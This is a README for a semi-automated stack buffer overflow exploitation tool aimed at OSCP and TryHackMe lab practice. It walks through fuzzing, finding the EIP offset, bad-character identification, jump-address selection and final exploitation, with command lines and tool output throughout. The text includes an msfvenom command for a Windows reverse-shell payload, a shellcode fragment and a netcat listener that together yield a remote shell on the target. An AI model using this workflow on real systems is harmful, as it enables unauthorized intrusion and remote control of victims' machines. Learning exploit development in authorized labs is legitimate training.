# Simple Stack Based Buffer Overflow Companion

Companion to assist simple stack based buffer overflow. Useful for OSCP and CTF.
Based on Tib3rius' [wonderful
tutorial](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
and [lab](https://tryhackme.com/room/bufferoverflowprep).

This script suite does not auto exploit. Just modified such that there are fewer
things you needed to change in the various steps. Less time needed to edit the scripts, more time
for hacking.

## Usage
```
$ python3 main.py -h
usage: main.py [-h] -s STAGE ip_addr port_num

Simple Stack Based Buffer Overflow Companion.
Based on tutorial
  https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
and lab
  https://tryhackme.com/room/bufferoverflowprep
by Tib3rius.
Modified to be semi-automated. Support both fuzzing and exploiting.

positional arguments:
  ip_addr               Target IP address, required.
  port_num              Target port number, required.

options:
  -h, --help            show this help message and exit
  -s STAGE, --stage STAGE
                        Attack stage, required.

Remember to change the relevant options in options.py

Attack Stages:
  1: Fuzzing
  2: Locating offset
  3: Testing EIP overwrite
  4: Identifying bad characters
  5: Exploitation
```

## PoC

### Step 0: Preparation

First connect to the vulnerable application manually via nc, to see what the
expected interactions are, such as:
- Does the server print a header/banner/message before user input can be
  provided?
- Do you need to prefix your inputs with a keyword? (e.g. "USER", "LOGIN")
- Do you need to postfix your inputs with a keyword? (e.g. "DONE", "END")
- Does the server respond to your input?

Once you know how to interact with the server, you might need to change
- options.py
```
# Change these if you need to
# Required for all the stages
## Remember to add a space or line break after
prefix = ""
## Remember to add a space or line break before
postfix = ""
```
- fuzzer.py
```
# Receive banner/greeting messages. Comment out if not needed
# Or add more if required
sock.recv(1024)

# DO NOT change
print(f"[*] Fuzzing with {len(data) - len(options.prefix) - len(options.postfix)} bytes")
sock.send(bytes(data, "latin-1"))

# Receive ending messages. Comment out if not needed
# Or add more if required
sock.recv(1024)
```

### Step 1: Fuzzing
```
$ python3 main.py -s 1 10.10.196.4 1337
################################################################################
# Simple Stack Based Buffer Overflow Companion v1.0                            #
# Based on tutorial and lab by Tib3rius                                        #
# https://github.com/Tib3rius/Pentest-Cheatsheets                              #
# https://tryhackme.com/room/bufferoverflowprep                                #
# Modified by terasi                                                           #
# https://github.com/tera-si                                                   #
################################################################################

[*] Using fuzzer module
[*] Fuzzing with 100 bytes
[*] Fuzzing with 200 bytes
[*] Fuzzing with 300 bytes
[*] Fuzzing with 400 bytes
[*] Fuzzing with 500 bytes
[*] Fuzzing with 600 bytes
[*] Fuzzing with 700 bytes
[!] Connection Error at 700 bytes
[!] Exception: timed out
[i] Please confirm from the debugger that the EIP is 41414141
```

### Step 2: Locating Offset
Take the crash location, add 400 (just to make sure), and then generate a unique pattern with
```
$ msf-pattern_create -l 1100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0...
```

Copy the output and paste it onto options.py
```
# Required for stage 2 only
## You can generate a pattern with
##      msf-pattern_create -l $n
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0..."
```

And then
```
$ python3 main.py -s 2 10.10.196.4 1337
################################################################################
# Simple Stack Based Buffer Overflow Companion v1.0                            #
# Based on tutorial and lab by Tib3rius                                        #
# https://github.com/Tib3rius/Pentest-Cheatsheets                              #
# https://tryhackme.com/room/bufferoverflowprep                                #
# Modified by terasi                                                           #
# https://github.com/tera-si                                                   #
################################################################################

[*] Using locate-offset module
[*] Sending pattern of length 1100
[*] Completed
[i] Please run "!mona findmsp -distance 1100" in Immunity
[i] Then look for the offset in "EIP: contains normal pattern: ... (offset XXX)"
```

In Immunity, run `!mona findmsp -distance 1100` to locate the offset

And update options.py accordingly
```
# Required for stage 3 and onwards
offset = 634
```

### Step 3: Testing EIP Overwrite
```
$ python3 main.py -s 3 10.10.196.4 1337
################################################################################
# Simple Stack Based Buffer Overflow Companion v1.0                            #
# Based on tutorial and lab by Tib3rius                                        #
# https://github.com/Tib3rius/Pentest-Cheatsheets                              #
# https://tryhackme.com/room/bufferoverflowprep                                #
# Modified by terasi                                                           #
# https://github.com/tera-si                                                   #
################################################################################

[*] Using test-EIP-overwrite module
[*] Using offset 634
[*] Using default return address "BBBB"
[*] Sending buffer
[*] Completed
[i] Please confirm in debugger that EIP is "42424242"
[i] Remember to run '!mona bytearray -b "\x00"' before starting the next stage
```

### Step 4: Identifying Bad Characters
First run `!mona bytearray -b "\x00"` in Immunity

Then
```
$ python3 main.py -s 4 10.10.196.4 1337
################################################################################
# Simple Stack Based Buffer Overflow Companion v1.0                            #
# Based on tutorial and lab by Tib3rius                                        #
# https://github.com/Tib3rius/Pentest-Cheatsheets                              #
# https://tryhackme.com/room/bufferoverflowprep                                #
# Modified by terasi                                                           #
# https://github.com/tera-si                                                   #
################################################################################

[*] Using identify-bad-chars module
[*] Filtering bad characters 00 from fuzz payload
[*] Sending characters list
[*] Completed
[i] Please take note of the ESP register in the debugger
[i] And then run "!mona compare -f path\to\bytearray.bin -a $ESP" in Immunity
[i] And then update options.py with the bad characters identified
[i] And then generate another bytearray with mona
[i] Repeat until there is no longer any bad characters
```

Note the ESP register in Immunity, and then run `!mona compare -f
path\to\bytearray.bin -a 12345678`

(If you did not set a working directory for Immunity, you can just run `!mona
compare -f bytearray.bin -a 12345678`)

And then update options.py
```
## Put ONLY the bad characters here
bad_chars = "\x00\x41"
```

And then restart the application in Immunity, and run `!mona bytearray -b
"\x00\x41..."` with the bad characters you've discovered so far.

Repeat this step until all bad characters are found.

### Step 4.5: Locating Jump Point and Generating Payload

First restart the application in Immunity, and then run `!mona jmp -r esp -cpb
"\x00..."` with the bad characters discovered.

Pick one of the addresses from the output, and then update options.py
```
# Required for Stage 5 only
## Jump address can be located by running
##      !mona jmp -r esp -cpb "\x00..."
## Remember to change to the correct bit order (endian) format
## e.g. 12345678 -> \x78\x56\x34\x12
## 625011c7
retn = "\xc7\x11\x50\x62"
```
Remember to change the bit order, as shown.

Then generate a payload with msfvenom with the bad characters identified:
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 EXITFUNC=thread -b "\x00..." -f c
```

Copy the shellcode and place it onto options.py
```
payload = ("\xfc\xbb\xcb\xaf\x4a\xdd\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
...
"\x5e\x13\x28\x54\x5e\x93\xd6\x57")
```

### Step 5: Exploitation

First start a listener
```
$ sudo rlwrap nc -lvnp 80
```

And then
```
$ python3 main.py -s 5 10.10.196.4 1337
################################################################################
# Simple Stack Based Buffer Overflow Companion v1.0                            #
# Based on tutorial and lab by Tib3rius                                        #
# https://github.com/Tib3rius/Pentest-Cheatsheets                              #
# https://tryhackme.com/room/bufferoverflowprep                                #
# Modified by terasi                                                           #
# https://github.com/tera-si                                                   #
################################################################################

[*] Using exploitation module
[*] Sending full exploit payload
[*] Completed
```

Enjoy your foothold.
